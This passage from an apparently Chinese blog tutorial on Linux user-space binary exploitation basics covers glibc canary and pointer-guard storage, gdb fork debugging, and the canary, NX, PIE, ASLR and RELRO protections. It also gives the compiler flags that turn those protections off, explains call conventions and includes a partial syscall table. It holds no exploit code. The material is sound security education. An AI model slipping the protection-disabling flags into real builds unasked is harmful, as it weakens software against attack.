<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">((pd)-&gt;header.stack_guard = (&#123;</span><br><span class="line">    __typeof((&#123;</span><br><span class="line">        <span class="keyword">struct</span> pthread *__self;</span><br><span class="line">        <span class="keyword">asm</span>(<span class="string">&quot;mov %%fs:%c1,%0&quot;</span>:<span class="string">&quot;=r&quot;</span>(__self):<span class="string">&quot;i&quot;</span>(((<span class="type">size_t</span>) (&amp;(((<span class="keyword">struct</span> pthread *) <span class="number">0</span>)-&gt;header.self)))));</span><br><span class="line">        __self;</span><br><span class="line">    &#125;)-&gt;header.stack_guard) __value;</span><br><span class="line">    <span class="keyword">_Static_assert</span>(<span class="keyword">sizeof</span>(__value) == <span class="number">1</span> || <span class="keyword">sizeof</span>(__value) == <span class="number">4</span> || <span class="keyword">sizeof</span>(__value) == <span class="number">8</span>, <span class="string">&quot;size of per-thread data&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">sizeof</span>(__value) == <span class="number">1</span>)<span class="keyword">asm</span> <span class="keyword">volatile</span>(<span class="string">&quot;movb %%fs:%P2,%b0&quot;</span>:<span class="string">&quot;=q&quot;</span>(__value):<span class="string">&quot;0&quot;</span>(<span class="number">0</span>), <span class="string">&quot;i&quot;</span>(((<span class="type">size_t</span>) (&amp;(((<span class="keyword">struct</span> pthread *) <span class="number">0</span>)-&gt;header.stack_guard))))); <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">sizeof</span>(__value) == <span class="number">4</span>)<span class="keyword">asm</span> <span class="keyword">volatile</span>(<span class="string">&quot;movl %%fs:%P1,%0&quot;</span>:<span class="string">&quot;=r&quot;</span>(__value):<span class="string">&quot;i&quot;</span>(((<span class="type">size_t</span>) (&amp;(((<span class="keyword">struct</span> pthread *) <span class="number">0</span>)-&gt;header.stack_guard))))); <span class="keyword">else</span> &#123; <span class="keyword">asm</span> <span class="keyword">volatile</span>(<span class="string">&quot;movq %%fs:%P1,%q0&quot;</span>:<span class="string">&quot;=r&quot;</span>(__value):<span class="string">&quot;i&quot;</span>(((<span class="type">size_t</span>) (&amp;(((<span class="keyword">struct</span> pthread *) <span class="number">0</span>)-&gt;header.stack_guard))))); &#125;</span><br><span class="line">    __value;</span><br><span class="line">&#125;))</span><br><span class="line"></span><br><span class="line">((pd)-&gt;header.pointer_guard = (&#123;</span><br><span class="line">    __typeof((&#123;</span><br><span class="line">        <span class="keyword">struct</span> pthread *__self;</span><br><span class="line">        <span class="keyword">asm</span>(<span class="string">&quot;mov %%fs:%c1,%0&quot;</span>:<span class="string">&quot;=r&quot;</span>(__self):<span class="string">&quot;i&quot;</span>(((<span class="type">size_t</span>) (&amp;(((<span class="keyword">struct</span> pthread *) <span class="number">0</span>)-&gt;header.self)))));</span><br><span class="line">        __self;</span><br><span class="line">    &#125;)-&gt;header.pointer_guard) __value;</span><br><span class="line">    <span class="keyword">_Static_assert</span>(<span class="keyword">sizeof</span>(__value) == <span class="number">1</span> || <span class="keyword">sizeof</span>(__value) == <span class="number">4</span> || <span class="keyword">sizeof</span>(__value) == <span class="number">8</span>, <span class="string">&quot;size of per-thread data&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">sizeof</span>(__value) == <span class="number">1</span>)<span class="keyword">asm</span> <span class="keyword">volatile</span>(<span class="string">&quot;movb %%fs:%P2,%b0&quot;</span>:<span class="string">&quot;=q&quot;</span>(__value):<span class="string">&quot;0&quot;</span>(<span class="number">0</span>), <span class="string">&quot;i&quot;</span>(((<span class="type">size_t</span>) (&amp;(((<span class="keyword">struct</span> pthread *) <span class="number">0</span>)-&gt;header.pointer_guard))))); <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">sizeof</span>(__value) == <span class="number">4</span>)<span class="keyword">asm</span> <span class="keyword">volatile</span>(<span class="string">&quot;movl %%fs:%P1,%0&quot;</span>:<span class="string">&quot;=r&quot;</span>(__value):<span class="string">&quot;i&quot;</span>(((<span class="type">size_t</span>) (&amp;(((<span class="keyword">struct</span> pthread *) <span class="number">0</span>)-&gt;header.pointer_guard))))); <span class="keyword">else</span> &#123; <span class="keyword">asm</span> <span class="keyword">volatile</span>(<span class="string">&quot;movq %%fs:%P1,%q0&quot;</span>:<span class="string">&quot;=r&quot;</span>(__value):<span class="string">&quot;i&quot;</span>(((<span class="type">size_t</span>) (&amp;(((<span class="keyword">struct</span> pthread *) <span class="number">0</span>)-&gt;header.pointer_guard))))); &#125;</span><br><span class="line">    __value;</span><br><span class="line">&#125;))</span><br></pre></td></tr></table></figure></div>
<p>不难看出这两个宏把当前线程（当前 fs 寄存器还没有指向新线程的 TCB）的 TLS 中的 <code>stack_guard</code> 和 <code>pointer_guard</code> 都复制到子线程的 TLS 的对应位置上。<strong>因此可以确定线程的 <code>stack_guard</code> 和 <code>pointer_guard</code> 与主线程相同。</strong></p>
<p>最后需要确定是 fs 寄存器何时被修改，因为 fs 寄存器不能再用户态修改，因此一定是一个系统调用完成了对 fs 寄存器的修改。</p>
<p>通过调试发现，<code>pthread_create-&gt;create_thread-&gt;clone</code> 中的 <code>clone</code> 系统调用完成了对 fs 寄存器的修改。</p>
<h1 id="子进程调试"><a href="#子进程调试" class="headerlink" title="子进程调试"></a>子进程调试</h1><p>gdb默认情况下，父进程 <code>fork</code> 一个子进程，gdb 只会继续调试父进程而不会管子进程的运行（pwndbg 插件设置相反）。</p>
<h2 id="相关设置"><a href="#相关设置" class="headerlink" title="相关设置"></a>相关设置</h2><ul>
<li>跟踪子进程进行调试，可以使用 <code>set follow-fork-mode mode</code> 来设置 <code>fork</code> 跟随模式。<ul>
<li><code>show follow-fork-mode</code>：进入 gdb 以后，我们可以使用 <code>show follow-fork-mode</code> 来查看目前的跟踪模式。</li>
<li><code>set follow-fork-mode parent</code>：gdb 只跟踪父进程，不跟踪子进程，这是默认的模式。</li>
<li><code>set follow-fork-mode child</code>：gdb 在子进程产生以后只跟踪子进程，放弃对父进程的跟踪。</li>
</ul>
</li>
<li>想同时调试父进程和子进程，以上的方法就不能满足了。Linux 提供了 <code>set detach-on-fork mode</code> 命令来供我们使用。<ul>
<li><code>show detach-on-fork</code>：<code>show detach-on-fork</code> 显示了目前是的 <code>detach-on-fork</code> 模式。</li>
<li><code>set detach-on-fork on</code>：只调试父进程或子进程的其中一个（根据 <code>follow-fork-mode</code> 来决定），这是默认的模式。</li>
<li><code>set detach-on-fork off</code>：父子进程都在 gdb 的控制之下，其中一个进程正常调试（根据 <code>follow-fork-mode</code> 来决定），另一个进程会被设置为暂停状态。</li>
</ul>
</li>
</ul>
<h2 id="调试进程切换"><a href="#调试进程切换" class="headerlink" title="调试进程切换"></a>调试进程切换</h2><p>使用 gdb 调试多进程时，如果想要在进程间进行切换，那么就需要</p>
<ul>
<li>在 <code>fork</code> 调用前设置： <code>set detach-on-fork off</code>。</li>
<li>使用 <code>info inferiors</code> 来查看进程信息，得到的信息可以看到最前面有一个进程编号，使用 <code>inferior num</code> 来进行进程切换。</li>
</ul>
<h1 id="常见保护"><a href="#常见保护" class="headerlink" title="常见保护"></a>常见保护</h1><p>checksec 可以查看程序开启了哪些保护。</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">➜  ~ checksec /bin/ls                                   </span><br><span class="line">[*] <span class="string">&#x27;/bin/ls&#x27;</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">    FORTIFY:  Enabled</span><br></pre></td></tr></table></figure></div>
<h2 id="Canary"><a href="#Canary" class="headerlink" title="Canary"></a>Canary</h2><p>canary 是一种防止缓冲区溢出攻击的保护机制。它的基本思想是在程序的堆栈中插入一个随机生成的数值，用于检测缓冲区溢出攻击。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:0000000000001189 endbr64</span><br><span class="line">.text:000000000000118D push    rbp</span><br><span class="line">.text:000000000000118E mov     rbp, rsp</span><br><span class="line">.text:0000000000001191 sub     rsp, 30h</span><br><span class="line">.text:0000000000001195 mov     rax, fs:28h</span><br><span class="line">.text:000000000000119E mov     [rbp-8], rax</span><br><span class="line">...</span><br><span class="line">.text:00000000000011CE mov     rdx, [rbp-8]</span><br><span class="line">.text:00000000000011D2 xor     rdx, fs:28h</span><br><span class="line">.text:00000000000011DB jz      short locret_11E2</span><br><span class="line">.text:00000000000011DB</span><br><span class="line">.text:00000000000011DD call    ___stack_chk_fail</span><br><span class="line">.text:00000000000011DD</span><br><span class="line">.text:00000000000011E2 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:00000000000011E2</span><br><span class="line">.text:00000000000011E2 locret_11E2:                            ; CODE XREF: f+52↑j</span><br><span class="line">.text:00000000000011E2 leave</span><br><span class="line">.text:00000000000011E3 retn</span><br></pre></td></tr></table></figure></div>
<p>canary 的初始值存储在 tls 中，也就是前面提到的 <code>stack_guard</code> 。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/07/linux-user-pwn-basic-knowlege/images/image-20241108005826545.png"
                      alt="image-20241108005826545"
                ><br>在编译 c 程序时使用 <code>-fno-stack-protector</code> 参数可以关闭 canary 保护（注意高版本的 gcc 的 canary 保护关不掉)。</p>
<h2 id="NX"><a href="#NX" class="headerlink" title="NX"></a>NX</h2><p>NX 即 No-eXecute（不可执行），NX 的基本原理是将数据所在内存页标识为不可执行，也就是同一内存可写与可执行不共存。</p>
<p>gcc 编译器默认开启了 NX 选项，如果需要关闭 NX 选项，可以给 gcc 编译器添加 <code>-zexecstack</code> 参数。</p>
<h2 id="PIE"><a href="#PIE" class="headerlink" title="PIE"></a>PIE</h2><p>PIE 主要随机了代码段（<code>.text</code>），初始化数据段（<code>.data</code>）和未初始化数据段（<code>.bss</code>）的地址。另外 PIE 是否开启还会影响堆的基址。</p>
<ul>
<li><p>开启 PIE：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/07/linux-user-pwn-basic-knowlege/images/image-20241108005851039.png"
                      alt="image-20241108005851039"
                ></p>
</li>
<li><p>关闭 PIE：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/image-20241108005913715.png"
                      alt="image-20241108005913715"
                ></p>
</li>
</ul>
<p>在编译 c 程序时使用 <code>-no-pie</code> 参数可以关闭 PIE 保护。</p>
<h2 id="ASLR"><a href="#ASLR" class="headerlink" title="ASLR"></a>ASLR</h2><p>ASLR 是系统级别的地址随机。通过修改 <code>/proc/sys/kernel/randomize_va_space</code> 的值可以控制 ASLR 的级别：</p>
<ul>
<li>0：关闭 ASLR</li>
<li>1：栈基址，共享库，mmap 基址随机</li>
<li>2：在 1 的基础上增加堆基址的随机</li>
</ul>
<h2 id="RELRO"><a href="#RELRO" class="headerlink" title="RELRO"></a>RELRO</h2><ul>
<li>当 RELRO 保护为 NO RELRO 的时候，<code>init.array</code> 、<code>fini.array</code> 、<code>got.plt</code> 均可读可写。</li>
<li>为 PARTIAL RELRO 的时候，<code>init.array</code> 、<code>fini.array</code> 根据实际调试结果判断是否可写，<code>got.plt</code> 可读可写。</li>
<li>为 FULL RELRO 时，<code>init.array</code> 、<code>fini.array</code> 、<code>got.plt</code> 均可读不可写。</li>
<li><code>-Wl,-z,norelro</code> 编译参数可以关闭 RELRO ，使 RELRO 状态变为 NO RELRO 。</li>
<li><code>-Wl,-z,lazy</code> 会开启延迟绑定，使 RELRO 状态变为 Partial RELRO 。</li>
</ul>
<h1 id="调用约定"><a href="#调用约定" class="headerlink" title="调用约定"></a>调用约定</h1><h2 id="栈结构"><a href="#栈结构" class="headerlink" title="栈结构"></a>栈结构</h2><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/07/linux-user-pwn-basic-knowlege/images/image-20241108005938556.png"
                      alt="image-20241108005938556"
                ><br><strong>注意 canary 不一定与 ebp 相邻，因为有些函数会先将一些寄存器保存到栈中。canary 实际位置以调试为准。</strong></p>
<h2 id="函数调用过程"><a href="#函数调用过程" class="headerlink" title="函数调用过程"></a>函数调用过程</h2><p>32位为例：</p>
<span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mtable rowspacing="0.25em" columnalign="right left" columnspacing="0em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mtext>push args</mtext></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mtext>call func</mtext><mrow><mo fence="true">{</mo><mtable rowspacing="0.16em" columnalign="center" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mtext>push next_eip</mtext></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mtext>jmp func</mtext></mstyle></mtd></mtr></mtable></mrow></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mtext>push ebp</mtext></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mtext>mov ebp,esp</mtext></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mi><mi mathvariant="normal">⋮</mi><mpadded height="0em" voffset="0em"><mspace mathbackground="black" width="0em" height="1.5em"></mspace></mpadded></mi></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mtext>leave</mtext><mrow><mo fence="true">{</mo><mtable rowspacing="0.16em" columnalign="center" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mtext>mov esp,ebp</mtext></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mtext>pop ebp</mtext></mstyle></mtd></mtr></mtable></mrow></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mtext>ret (pop eip)</mtext></mrow></mstyle></mtd></mtr></mtable><annotation encoding="application/x-tex">
\begin{align*}
&amp; \text{push args}\\
&amp; \text{call func}\left\{\begin{matrix}
\text{push next\_eip}\\ 
\text{jmp func}
\end{matrix}\right.\\
&amp; \text{push ebp}\\
&amp; \text{mov ebp,esp}\\
&amp; \vdots \\
&amp; \text{leave}\left\{\begin{matrix}
\text{mov esp,ebp}\\ 
\text{pop ebp}
\end{matrix}\right.\\
&amp;\text{ret}\ \text{(pop eip)}
\end{align*}
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:13.5601em;vertical-align:-6.53em;"></span><span class="mord"><span class="mtable"><span class="col-align-r"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:7.03em;"><span style="top:-9.69em;"><span class="pstrut" style="height:3.5em;"></span><span class="mord"></span></span><span style="top:-7.58em;"><span class="pstrut" style="height:3.5em;"></span><span class="mord"></span></span><span style="top:-5.49em;"><span class="pstrut" style="height:3.5em;"></span><span class="mord"></span></span><span style="top:-3.99em;"><span class="pstrut" style="height:3.5em;"></span><span class="mord"></span></span><span style="top:-1.83em;"><span class="pstrut" style="height:3.5em;"></span><span class="mord"></span></span><span style="top:0.28em;"><span class="pstrut" style="height:3.5em;"></span><span class="mord"></span></span><span style="top:2.37em;"><span class="pstrut" style="height:3.5em;"></span><span class="mord"></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:6.53em;"><span></span></span></span></span></span><span class="col-align-l"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:7.03em;"><span style="top:-9.8775em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord"></span><span class="mord text"><span class="mord">push args</span></span></span></span><span style="top:-7.7675em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord"></span><span class="mord text"><span class="mord">call func</span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size3">{</span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.45em;"><span style="top:-3.61em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord text"><span class="mord">push next_eip</span></span></span></span><span style="top:-2.41em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord text"><span class="mord">jmp func</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.95em;"><span></span></span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span><span style="top:-5.6775em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord"></span><span class="mord text"><span class="mord">push ebp</span></span></span></span><span style="top:-4.1775em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord"></span><span class="mord text"><span class="mord">mov ebp,esp</span></span></span></span><span style="top:-2.0175em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord"></span><span class="mord"><span class="mord">⋮</span><span class="mord rule" style="border-right-width:0em;border-top-width:1.5em;bottom:0em;"></span></span></span></span><span style="top:0.0925em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord"></span><span class="mord text"><span class="mord">leave</span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size3">{</span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.45em;"><span style="top:-3.61em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord text"><span class="mord">mov esp,ebp</span></span></span></span><span style="top:-2.41em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord text"><span class="mord">pop ebp</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.95em;"><span></span></span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span><span style="top:2.1825em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord"></span><span class="mord text"><span class="mord">ret</span></span><span class="mspace"> </span><span class="mord text"><span class="mord">(pop eip)</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:6.53em;"><span></span></span></span></span></span></span></span></span></span></span></span>


<h2 id="函数参数传递"><a href="#函数参数传递" class="headerlink" title="函数参数传递"></a>函数参数传递</h2>
  <div class="note p-4 mb-4 rounded-small red icon-padding">
    <i class="note-icon fa-solid fa-bolt"></i><p>注意：通常 linux 下的程序的函数调用都是外平栈的。</p>

  </div>

<h3 id="32位程序"><a href="#32位程序" class="headerlink" title="32位程序"></a>32位程序</h3><ul>
<li>普通函数传参：参数基本都压在栈上（有寄存器传参的情况，可查阅相关资料）。</li>
<li><code>int 0x80</code> 传参：eax对应系统调用号，ebx、ecx、edx、esi、edi、ebp 分别对应前六个参数多余的参数压在栈上。</li>
</ul>
<h3 id="64位程序："><a href="#64位程序：" class="headerlink" title="64位程序："></a>64位程序：</h3><ul>
<li>普通函数传参：先使用 rdi、rsi、rdx、rcx、r8、r9 寄存器作为函数参数的前六个参数，多余的参数会依次压在栈上。</li>
<li><code>syscall</code> 传参：rax 对应系统调用号，传参规则与普通函数传参一致。</li>
</ul>
<h2 id="系统调用号"><a href="#系统调用号" class="headerlink" title="系统调用号"></a>系统调用号</h2><h3 id="32-位"><a href="#32-位" class="headerlink" title="32 位"></a>32 位</h3><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifndef</span> _ASM_X86_UNISTD_32_H</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _ASM_X86_UNISTD_32_H 1</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_restart_syscall 0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_exit 1</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fork 2</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_read 3</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_write 4</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_open 5</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_close 6</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_waitpid 7</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_creat 8</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_link 9</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_unlink 10</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_execve 11</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_chdir 12</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_time 13</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_mknod 14</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_chmod 15</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_lchown 16</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_break 17</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_oldstat 18</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_lseek 19</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getpid 20</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_mount 21</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_umount 22</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setuid 23</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getuid 24</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_stime 25</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_ptrace 26</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_alarm 27</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_oldfstat 28</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_pause 29</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_utime 30</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_stty 31</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_gtty 32</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_access 33</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_nice 34</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_ftime 35</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sync 36</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_kill 37</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_rename 38</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_mkdir 39</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_rmdir 40</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_dup 41</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_pipe 42</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_times 43</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_prof 44</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_brk 45</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setgid 46</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getgid 47</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_signal 48</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_geteuid 49</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getegid 50</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_acct 51</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_umount2 52</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_lock 53</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_ioctl 54</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fcntl 55</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_mpx 56</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setpgid 57</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_ulimit 58</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_oldolduname 59</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_umask 60</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_chroot 61</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_ustat 62</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_dup2 63</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getppid 64</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getpgrp 65</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setsid 66</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sigaction 67</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sgetmask 68</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_ssetmask 69</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setreuid 70</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setregid 71</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sigsuspend 72</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sigpending 73</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sethostname 74</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setrlimit 75</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getrlimit 76</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getrusage 77</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_gettimeofday 78</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_settimeofday 79</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getgroups 80</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setgroups 81</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_select 82</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_symlink 83</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_oldlstat 84</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_readlink 85</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_uselib 86</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_swapon 87</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_reboot 88</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_readdir 89</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_mmap 90</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_munmap 91</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_truncate 92</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_ftruncate 93</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fchmod 94</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fchown 95</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getpriority 96</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setpriority 97</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_profil 98</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_statfs 99</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fstatfs 100</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_ioperm 101</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_socketcall 102</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_syslog 103</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setitimer 104</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getitimer 105</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_stat 106</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_lstat 107</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fstat 108</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_olduname 109</span></span><br><span class="line"><span 